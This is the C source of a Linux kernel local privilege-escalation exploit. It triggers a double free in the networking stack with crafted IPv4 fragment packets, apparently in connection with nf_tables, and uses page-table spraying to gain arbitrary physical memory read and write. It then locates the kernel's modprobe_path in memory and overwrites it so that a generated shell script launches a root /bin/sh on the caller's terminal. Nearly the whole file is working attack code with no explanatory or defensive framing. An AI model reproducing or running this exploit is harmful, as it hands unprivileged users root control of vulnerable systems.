#define _GNU_SOURCE 1
#include <unistd.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <netinet/ip.h>
#include <string.h>
#include <arpa/inet.h>

#include "common.h"
#include "nf_tables.h"
#include "log.h"
#include "env.h"
#include "config.h"
#include "net.h"

#define EXPLOIT_STAT_RUNNING 0
#define EXPLOIT_STAT_FINISHED 3
#define SPINLOCK(cmp) while (cmp) { usleep(10 * 1000); }

#define _pte_index_to_virt(i) (i << 12)
#define _pmd_index_to_virt(i) (i << 21)
#define _pud_index_to_virt(i) (i << 30)
#define _pgd_index_to_virt(i) (i << 39)
#define PTI_TO_VIRT(pud_index, pmd_index, pte_index, page_index, byte_index) \
	((void*)(_pgd_index_to_virt((unsigned long long)(pud_index)) + _pud_index_to_virt((unsigned long long)(pmd_index)) + \
	_pmd_index_to_virt((unsigned long long)(pte_index)) + _pte_index_to_virt((unsigned long long)(page_index)) + (unsigned long long)(byte_index)))

void signal_handler_sleep(int sig) {
    logd("[*] handling ctrl-c by sleeping background thread");
    logw("!! >> if you did this while in the root shell, the terminal will be messed up << !!");
    sleep(9999);
}

int get_modprobe_path(char *buf, uint64_t buf_len) {
    int size;
    size = read_file("/proc/sys/kernel/modprobe", buf, buf_len);
    if (size == buf_len)
        logw("==== read max amount of modprobe_path bytes, perhaps increment KMOD_PATH_LEN? ====");

    buf[size-1] = '\x00';
    return size;
}

static char intermed_buf[1 << 19];

static void send_ipv4_ip_hdr_chr(size_t dfsize, struct ip *ip_header, char chr)
{
	memset(intermed_buf, chr, dfsize);
	send_ipv4_ip_hdr(intermed_buf, dfsize, ip_header);
}

static void alloc_intermed_buf_hdr(size_t dfsize, struct ip *ip_header)
{
	logd("sending intermediate buffer packet...");
	send_ipv4_ip_hdr_chr(dfsize, ip_header, '\x00');
}

static void alloc_ipv4_udp(size_t content_size)
{
	memset(intermed_buf, '\x00', content_size);
	send_ipv4_udp(intermed_buf, content_size);
}

static void trigger_double_free_hdr(size_t dfsize, struct ip *ip_header)
{
	logi("sending double free buffer packet...");
	send_ipv4_ip_hdr_chr(dfsize, ip_header, '\x41');
}

static void set_ipfrag_time(unsigned int seconds)
{
	int fd;

	if ((fd = open("/proc/sys/net/ipv4/ipfrag_time", O_WRONLY)) < 0)
        die("open$ipfrag_time");

	dprintf(fd, "%u\n", seconds);
	close(fd);
}

static int strcmp_modprobe_path(char *new_str) 	// 读取/proc/sys/kernel/modprobe检查是否成功篡改
{
	char buf[KMOD_PATH_LEN];

	get_modprobe_path(buf, KMOD_PATH_LEN);
	
	return strncmp(new_str, buf, KMOD_PATH_LEN);
}

void *memmem_modprobe_path(void *haystack_virt, size_t haystack_len, char *modprobe_path_str, size_t modprobe_path_len)
{
	void *pmd_modprobe_addr;

	pmd_modprobe_addr = memmem(haystack_virt, haystack_len, modprobe_path_str, modprobe_path_len);
	if (pmd_modprobe_addr == NULL)
		return NULL;

	strcpy(pmd_modprobe_addr, "/sanitycheck");
	if (strcmp_modprobe_path("/sanitycheck") != 0)
	{
		loge("^false positive. skipping to next one");
		return NULL;
	}

	return pmd_modprobe_addr;
}

#define FLUSH_STAT_INPROGRESS 0
#define FLUSH_STAT_DONE 1

static void flush_tlb(void *addr, size_t len)
{
	short *status;

	status = mmap(NULL, sizeof(short), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	
	*status = FLUSH_STAT_INPROGRESS;
	if (fork() == 0)
	{
		munmap(addr, len);
		*status = FLUSH_STAT_DONE;
		sleep(9999);
	}

	SPINLOCK(*status == FLUSH_STAT_INPROGRESS); 

	munmap(status, sizeof(short));
}

static int is_kernel_base(unsigned char *addr)
{
	if (memcmp(addr + 0x0, "\xfc\x0f\x01\x15\x80\x44\x75\x03\xb8\x10\x00\x00\x00\x8e\xd8\x8e\xc0\x8e\xd0\xbf\x40\x34\x75\x03\x89\xde\x8b\x0d\x70\x4a\x8e\x03", 32) == 0)
		return 1;

	return 0;
}

static void modprobe_trigger_memfd()
{
	int fd;
	char *argv_envp = NULL;

	fd = memfd_create("", MFD_CLOEXEC);
	write(fd, "\xff\xff\xff\xff", 4);

	fexecve(fd, &argv_envp, &argv_envp);
	
	close(fd);
}

#define MEMCPY_HOST_FD_PATH(buf, pid, fd) sprintf((buf), "/proc/%u/fd/%u", (pid), (fd));

void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd) {
    uint64_t *pte_area;
    void *_pmd_area;
    void *pmd_kernel_area;
    void *pmd_data_area;
	struct ip df_ip_header = {
		.ip_v = 4,
		.ip_hl = 5,
		.ip_tos = 0,
		.ip_len = 0xDEAD,
		.ip_id = 0xDEAD, 
		.ip_off = 0xDEAD,
		.ip_ttl = 128,
		.ip_p = 70,
		.ip_src.s_addr = inet_addr("1.1.1.1"),
		.ip_dst.s_addr = inet_addr("255.255.255.255"),
	};
    char modprobe_path[KMOD_PATH_LEN];

    logi("Stage 0: initialize");
    get_modprobe_path(modprobe_path, KMOD_PATH_LEN);
    
    logd("running normal privesc");
    logd("doing first useless allocs to setup caching and stuff...");
    bind_core(0);

    logi("Step 0-1: pre-allocate a PUD");
    mmap((void*)PTI_TO_VIRT(1, 0, 0, 0, 0), 0x2000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	*(uint64_t *)PTI_TO_VIRT(1, 0, 0, 0, 0) = 0xDEADBEEF;

    logi("Step 0-2: prapare 16000 PTEs waiting for spray, each PTE contains 2 entrys");
    for (uint64_t i = 0; i < CONFIG_PTE_SPRAY_AMOUNT; i++) {
        if (mmap((void*)PTI_TO_VIRT(2, 0, i, 0, 0), 0x2000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0) == MAP_FAILED)
            die("mmap$PTE_SPRAY");
    }

    logi("Step 0-3: pre-allocate 16000/512 PMDs, ");
    for (uint64_t i = 0; i < CONFIG_PTE_SPRAY_AMOUNT/512; i++) 
        *(char *)PTI_TO_VIRT(2, i, 0, 0, 0) = 0x41;

    logi("Step 0-4: prepare 2 PMD entrys");
    _pmd_area = mmap((void*)PTI_TO_VIRT(1, 1, 0, 0, 0), 0x400000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    pmd_kernel_area = _pmd_area;
    pmd_data_area = _pmd_area + 0x200000;
    logs("allocated VMAs for process:\n  - pte_area: ?\n  - _pmd_area: %p\n  - modprobe_path: '%s' @ %p", _pmd_area, modprobe_path, modprobe_path);

    logi("Step 0-5: create 5 sockets: ip/udp client/udp server/tcp client/tcp server");
    populate_sockets();

    set_ipfrag_time(1);

    df_ip_header.ip_id = 0x1336;
    df_ip_header.ip_len = sizeof(struct ip) * 2 + 0x8000 + 8 + 4000;
    df_ip_header.ip_off = ntohs((8 >> 3) | 0x2000); 
    alloc_intermed_buf_hdr(32768 + 8, &df_ip_header);

    set_ipfrag_time(9999);
    logd("waiting for the calm before the storm...");
    sleep(CONFIG_SEC_BEFORE_STORM);

    logi("Stage 1: trigger double-free");
    
    logi("Step 1-1: allocate 170 skbs");
    for (int i = 0; i < CONFIG_SKB_SPRAY_AMOUNT; i++) {
        alloc_ipv4_udp(1);
    }

    logi("Step 1-2: 1st free skb");
	df_ip_header.ip_id = 0x1337;
	df_ip_header.ip_len = sizeof(struct ip)*2 + 0x8000 + 24;
	df_ip_header.ip_off = ntohs((0 >> 3) | 0x2000);
    trigger_double_free_hdr(0x8000 + 8, &df_ip_header);

    logi("Step 1-3: release 170 skbs");
    for (int i = 0; i < CONFIG_SKB_SPRAY_AMOUNT; i++) {
        recv_ipv4_udp(1);
    }

    logi("Steap 1-4: spraying %d pte's...", CONFIG_PTE_SPRAY_AMOUNT);
    for (uint64_t i = 0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
        *(char *)PTI_TO_VIRT(2, 0, i, 0, 0) = 0x41;

    logi("Step 1-5: 2nd free skb");
	df_ip_header.ip_id = 0x1337;
	df_ip_header.ip_len = sizeof(struct ip)*2 + 32768 + 24;
	df_ip_header.ip_off = ntohs(((32768 + 8) >> 3) | 0x2000);

    alloc_intermed_buf_hdr(0, &df_ip_header);

    logi("Step 1-6: allocate a pmd page and pmd[0]/pmd[1] will overlap pte[0]/pte[1]");
    *(uint64_t *)_pmd_area = 0xcafebabe;
    
    logi("Step 1-7: checking %d sprayed pte's for overlap...", CONFIG_PTE_SPRAY_AMOUNT);
	pte_area = NULL;
	for (uint64_t i = 0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
	{
		uint64_t *test_target_addr = PTI_TO_VIRT(2, 0, i, 0, 0);

		if (*test_target_addr != 0x41)
		{
			logs("confirmed double alloc PMD/PTE");
			logs("    - PTE area index: %lld", i);
			logs("    - PTE area (write target address/page): %016llx (new)", *test_target_addr);
			pte_area = test_target_addr;
		}
	}
	
    if (pte_area == NULL)
        loge("failed to detect overwritten pte: is more PTE spray needed? pmd: %016llx", *(uint64_t *)_pmd_area);

	*pte_area = 0x0 | 0x8000000000000867;

	flush_tlb(_pmd_area, 0x400000);
	logs("    - PMD area (read target value/page): %016llx (new)", *(uint64_t *)_pmd_area);

	int modprobe_script_fd = memfd_create("", MFD_CLOEXEC);
	int status_fd = memfd_create("", 0);

	for (int k=0; k < (CONFIG_PHYS_MEM / (CONFIG_PHYSICAL_ALIGN * 512)); k++)
	{
		uint64_t kernel_iteration_base;

		kernel_iteration_base = k * (CONFIG_PHYSICAL_ALIGN * 512);
		
		logd("setting kernel physical address range to 0x%016llx - 0x%016llx", kernel_iteration_base, kernel_iteration_base + CONFIG_PHYSICAL_ALIGN * 512);
		for (unsigned short j=0; j < 512; j++)
			pte_area[j] = (kernel_iteration_base + CONFIG_PHYSICAL_ALIGN * j) | 0x8000000000000867;
		
		flush_tlb(_pmd_area, 0x400000);

		for (uint64_t j=0; j < 512; j++)
		{
			uint64_t phys_kernel_base;
		
			phys_kernel_base = kernel_iteration_base + CONFIG_PHYSICAL_ALIGN * j;

			if (is_kernel_base(pmd_kernel_area + j * 0x1000) == 0)
				continue;

			logs("found possible physical kernel base: %016llx", phys_kernel_base);

			for (int i=0; i < 4000; i++) 
			{
				void *pmd_modprobe_addr;
				uint64_t phys_modprobe_addr;
				uint64_t modprobe_iteration_base;

				modprobe_iteration_base = phys_kernel_base + i * 0x200000;

				logd("setting physical address range to 0x%016llx - 0x%016llx", modprobe_iteration_base, modprobe_iteration_base + 0x200000);

				for (int j=0; j < 512; j++)
					pte_area[512 + j] = (modprobe_iteration_base + 0x1000 * j) | 0x8000000000000867;

				flush_tlb(_pmd_area, 0x400000);
				
				pmd_modprobe_addr = memmem_modprobe_path(pmd_data_area, 0x200000, "/sbin/modprobe", 14);

				if (pmd_modprobe_addr == NULL)
					continue;

				phys_modprobe_addr = modprobe_iteration_base + (pmd_modprobe_addr - pmd_data_area);
				logs("verified modprobe_path/usermodehelper_path: %016llx ('%s')...", phys_modprobe_addr, (char*)pmd_modprobe_addr);
			
				logi("modprobe_script_fd: %d, status_fd: %d", modprobe_script_fd, status_fd);
				
				logi("overwriting path with PIDs in range 0->4194304...");
				for (pid_t pid_guess=0; pid_guess < 4194304; pid_guess++)
				{
					int status_cnt;
					char buf;

					MEMCPY_HOST_FD_PATH(pmd_modprobe_addr, pid_guess, modprobe_script_fd);

					if (pid_guess % 50 == 0)
					{
						logd("overwriting modprobe_path with different PIDs (%u-%u)...", pid_guess, pid_guess + 50);
						logd("    - i.e. '%s' @ %p...", (char*)pmd_modprobe_addr, pmd_modprobe_addr);
						logd("    - matching modprobe_path scan var: '%s' @ %p)...", modprobe_path, modprobe_path);
					}

					lseek(modprobe_script_fd, 0, SEEK_SET); 
					dprintf(modprobe_script_fd, "#!/bin/sh\necho -n 1 1>/proc/%u/fd/%u\n/bin/sh 0</proc/%u/fd/%u 1>/proc/%u/fd/%u 2>&1\n", pid_guess, status_fd, pid_guess, shell_stdin_fd, pid_guess, shell_stdout_fd);

					modprobe_trigger_memfd();

					status_cnt = read(status_fd, &buf, 1);
					if (status_cnt == 0)
						continue;

					logs("successfully breached the mainframe as real-PID %u", pid_guess);

					return;
				}

				logw("verified modprobe_path address does not work... CONFIG_STATIC_USERMODEHELPER enabled?");

				return;
			}
			
			loge("failed to find correct modprobe_path: trying to find new kernel base...");
		}
	}
}

int main() {
    int *exploit_status;
    exploit_status = mmap(NULL, sizeof(int), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    *exploit_status = EXPLOIT_STAT_RUNNING;

    if (fork() == 0) {
        int shell_stdin_fd;
        int shell_stdout_fd;

        signal(SIGINT, signal_handler_sleep);

        shell_stdin_fd = dup(STDIN_FILENO);
        shell_stdout_fd = dup(STDOUT_FILENO);

        setup_env();
        privesc_flh_bypass_no_time(shell_stdin_fd, shell_stdout_fd);

        *exploit_status = EXPLOIT_STAT_FINISHED;

        sleep(9999);
    }

    SPINLOCK(*exploit_status == EXPLOIT_STAT_RUNNING)

    return 0;
}

